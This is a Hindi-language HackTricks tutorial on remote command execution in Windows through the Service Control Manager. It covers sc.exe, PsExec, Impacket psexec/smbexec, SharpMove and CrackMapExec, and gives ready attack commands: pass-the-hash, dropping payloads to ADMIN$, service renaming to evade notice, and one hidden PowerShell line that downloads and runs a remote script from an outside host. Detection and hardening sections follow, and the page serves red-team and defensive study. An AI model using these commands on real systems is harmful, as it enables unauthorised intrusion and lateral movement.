# रिमोट सर्विस एक्ज़ीक्यूशन (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## ये कैसे काम करते हैं

ये तकनीकें किसी टार्गेट होस्ट पर कमांड चलाने के लिए SMB/RPC के ज़रिए Windows Service Control Manager (SCM) का दूरस्थ रूप से दुरुपयोग करती हैं। Service Control Manager Remote Protocol (SCMR), किसी दूरस्थ कंप्यूटर पर Windows services को कॉन्फ़िगर और नियंत्रित करने के लिए RPC-आधारित इंटरफ़ेस है। पर्याप्त अनुमतियाँ होने पर, ऑपरेटर ऐसी service बना या फिर से कॉन्फ़िगर कर सकता है जिसके binary path में कोई कमांड हो, और फिर उस service को शुरू करके उसे दूरस्थ रूप से चला सकता है।<sup>[[5]](#references)</sup> आम तौर पर यह प्रक्रिया इस तरह होती है:

1. SMB/RPC (TCP/445) के ज़रिए टार्गेट से authenticate करें; जब चुने गए variant को वहाँ कोई फ़ाइल रखने या output प्राप्त करने की ज़रूरत हो, तो ADMIN$ share का उपयोग करें।
2. कोई executable कॉपी करें या ऐसी LOLBAS कमांड लाइन निर्दिष्ट करें जिसे service चलाएगी।
3. SCM (MS-SCMR over \PIPE\svcctl) के ज़रिए दूरस्थ रूप से ऐसी service बनाएँ जो उस कमांड या binary की ओर इंगित करे।
4. Payload चलाने के लिए service शुरू करें और, वैकल्पिक रूप से, named pipe के ज़रिए stdin/stdout प्राप्त करें।
5. Service बंद करके सफ़ाई करें (service और वहाँ रखी गई सभी binaries को delete करें)।

आवश्यकताएँ/पूर्वापेक्षाएँ:
- टार्गेट पर Local Administrator (SeCreateServicePrivilege) या टार्गेट पर service बनाने के स्पष्ट अधिकार।
- SMB (445) तक पहुँच हो और host firewall में Remote Service Management की अनुमति हो; जिन variants में फ़ाइल रखने या output प्राप्त करने के लिए ADMIN$ का उपयोग होता है, उनमें ADMIN$ उपलब्ध होना चाहिए।
- UAC Remote Restrictions: local accounts के साथ, token filtering नेटवर्क पर admin access रोक सकता है, जब तक कि built-in Administrator का उपयोग न किया जाए या LocalAccountTokenFilterPolicy=1 सेट न हो।
- Kerberos बनाम NTLM: hostname/FQDN का उपयोग करने से Kerberos सक्षम होता है; IP से कनेक्ट करने पर अक्सर NTLM का उपयोग होता है (और कड़े सुरक्षा वाले environments में इसे रोका जा सकता है)।

अगर कोई service account निर्दिष्ट न किया जाए, तो `CreateService` `LocalSystem` का उपयोग करता है, जिसके पास स्थानीय स्तर पर व्यापक privileges होते हैं। इससे SCM execution सफल होने का गंभीर प्रभाव समझ में आता है। इससे अपने-आप UAC या Microsoft Defender बंद नहीं होते: कॉलर को अब भी दूरस्थ SCM अधिकार चाहिए, और endpoint controls service या payload की जाँच कर सकते हैं या उन्हें रोक सकते हैं।<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### sc.exe के ज़रिए Manual ScExec/WinExec

नीचे service बनाने का एक न्यूनतम तरीका दिखाया गया है। Service image, वहाँ रखी गई EXE या cmd.exe अथवा powershell.exe जैसे किसी LOLBAS की हो सकती है।

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- गैर-service EXE शुरू करते समय timeout error आने की अपेक्षा करें; execution फिर भी होता है।
- अधिक OPSEC-friendly बने रहने के लिए, fileless commands (cmd /c, powershell -enc) को प्राथमिकता दें या छोड़े गए artifacts हटा दें।

अधिक विस्तृत चरण यहाँ देखें: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## टूलिंग और उदाहरण

### Sysinternals PsExec.exe

- क्लासिक admin tool, जो SMB का उपयोग करके ADMIN$ में PSEXESVC.exe डालता है, एक अस्थायी service (डिफ़ॉल्ट नाम PSEXESVC) इंस्टॉल करता है, और named pipes पर I/O को proxy करता है।
- उपयोग के उदाहरण:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- आप Sysinternals Live से WebDAV के माध्यम से सीधे चला सकते हैं:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Service install/uninstall events छोड़ता है (Service name अक्सर PSEXESVC होता है, जब तक -r का उपयोग न किया जाए) और execution के दौरान C:\Windows\PSEXESVC.exe बनाता है।

### Impacket psexec.py (PsExec-like)

- Embedded RemCom-like service का उपयोग करता है। ADMIN$ के ज़रिए एक transient service binary (आमतौर पर randomized name) डालता है, एक service बनाता है (डिफ़ॉल्ट रूप से अक्सर RemComSvc) और named pipe के ज़रिए I/O को proxy करता है।

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Kali पर, Impacket के उदाहरण `/usr/share/doc/python3-impacket/examples/` में हो सकते हैं। यदि कोई पासवर्ड नहीं दिया जाता है, तो टूल पासवर्ड के लिए पूछता है। Impacket का `-k` NTLM के बजाय Kerberos authentication का अनुरोध करता है, और आमतौर पर वर्तमान credential cache या दिए गए credentials का उपयोग करता है।

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

आर्टिफैक्ट्स
- C:\Windows\ में अस्थायी EXE (8 यादृच्छिक अक्षर)। ओवरराइड न किए जाने पर Service name का डिफ़ॉल्ट RemComSvc होता है।

### Impacket smbexec.py (SMBExec)

- एक अस्थायी service बनाता है, जो cmd.exe को शुरू करती है और I/O के लिए named pipe का उपयोग करती है। आम तौर पर पूरा EXE payload ड्रॉप करने से बचता है; command execution अर्ध-इंटरैक्टिव होता है।

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) service-based exec सहित कई lateral movement methods लागू करता है।

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) SCM और Windows के कई अन्य mechanisms के ज़रिए authenticated remote execution को support करता है, जिसमें service modification/creation भी शामिल है।

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- आप अलग-अलग backends (psexec/smbexec/wmiexec) के जरिए execute करने के लिए CrackMapExec का भी उपयोग कर सकते हैं:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SharpMove के साथ SCMExec

SCM action `WindowsDebug` नाम की एक service बनाता है और उसे remote host पर पहले से मौजूद payload की ओर इंगित करता है।<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, पहचान और आर्टिफैक्ट

PsExec जैसी तकनीकों का उपयोग करने पर आमतौर पर होस्ट/नेटवर्क पर दिखने वाले आर्टिफैक्ट:
- उपयोग किए गए admin account के लिए target पर Security 4624 (Logon Type 3) और 4672 (Special Privileges)।
- Security 5140/5145 File Share और File Share Detailed events, जिनमें ADMIN$ access और service binaries (जैसे PSEXESVC.exe या random 8-char .exe) को create/write करना दिखता है।
- target पर service installation के लिए Service Control Manager से **System** 7045: PSEXESVC, RemComSvc या custom नाम (`-r` / `-service-name`)। इससे साबित होता है कि service install हुई थी, यह नहीं कि उसकी image चली थी। उपलब्ध होने पर timestamp और image path का process events या मेल खाने वाली service-image prefetch entry से मिलान करें।<sup>[[4]](#references)</sup>
- services.exe या service image के लिए Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ में 11 (File Create), और \\.\pipe\psexesvc, \\.\pipe\remcom_* या random equivalents जैसी pipes के लिए 17/18 (Pipe Created/Connected)।
- Sysinternals EULA के लिए Registry आर्टिफैक्ट: operator host पर HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (अगर इसे suppress न किया गया हो)।

खोज के सुझाव
- ऐसे service installs पर alert करें जिनके ImagePath में cmd.exe /c, powershell.exe या TEMP locations हों।
- ऐसी process creations खोजें जिनमें ParentImage C:\Windows\PSEXESVC.exe हो, या services.exe के ऐसे child हों जो LOCAL SYSTEM के रूप में shells चला रहे हों।
- -stdin/-stdout/-stderr पर खत्म होने वाली named pipes या PsExec clone के जाने-पहचाने pipe names को flag करें।

## आम समस्याओं का निवारण
- Services बनाते समय Access is denied (5): संभवतः उपयोगकर्ता वास्तव में local admin नहीं है, local accounts के लिए UAC remote restrictions लागू हैं, या EDR service binary path पर tampering protection कर रहा है।
- Network path was not found (53) या कनेक्ट नहीं हो सका: firewall SMB/RPC को रोक रहा है या admin shares disabled हैं।
- Kerberos विफल होता है लेकिन NTLM blocked है: hostname/FQDN (IP नहीं) से connect करें, सही SPNs सुनिश्चित करें, या Impacket इस्तेमाल करते समय tickets के साथ -k/-no-pass दें।
- Service start timeout हो जाता है, लेकिन payload चल चुका होता है: अगर यह असली service binary नहीं है तो यह अपेक्षित है; output को file में capture करें या live I/O के लिए smbexec इस्तेमाल करें।

## Hardening संबंधी नोट्स
- Windows 11 24H2 और Windows Server 2025 में outbound connections के लिए (और Windows 11 में inbound connections के लिए) SMB signing डिफ़ॉल्ट रूप से आवश्यक है। इससे वैध creds के साथ PsExec का सामान्य उपयोग नहीं रुकता, लेकिन unsigned SMB relay abuse रुकता है और signing को support न करने वाले devices पर असर पड़ सकता है।<sup>[[2]](#references)</sup>
- नया SMB client NTLM blocking (Windows 11 24H2/Server 2025) IP से या non-Kerberos servers से connect करते समय NTLM fallback रोक सकता है। Hardened environments में इससे NTLM-आधारित PsExec/SMBExec काम नहीं करेगा; Kerberos (hostname/FQDN) इस्तेमाल करें या ज़रूरत होने पर exceptions configure करें।<sup>[[2]](#references)</sup>
- न्यूनतम विशेषाधिकार का सिद्धांत: local admin membership कम से कम रखें, Just-in-Time/Just-Enough Admin को प्राथमिकता दें, LAPS लागू करें, और 7045 service installs की निगरानी करें/उन पर alert करें।

## यह भी देखें

- WMI-आधारित remote exec (अक्सर अधिक fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-आधारित remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 और Windows 11 में SMB security hardening](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Windows Boxes पर कब्ज़ा करने के लिए Credentials का उपयोग - भाग 2 (PSExec और Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – system event logs का उपयोग करके अप्रत्याशित reboots का निवारण](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol का अवलोकन](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
